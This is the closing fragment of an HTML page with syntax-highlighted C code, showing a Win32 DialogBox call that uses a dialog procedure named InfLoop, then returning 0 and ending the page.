</span><span class="sc0">    </span><span class="sc11">DialogBox</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hThisInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ID_DIALOG"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DLGPROC</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">InfLoop</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
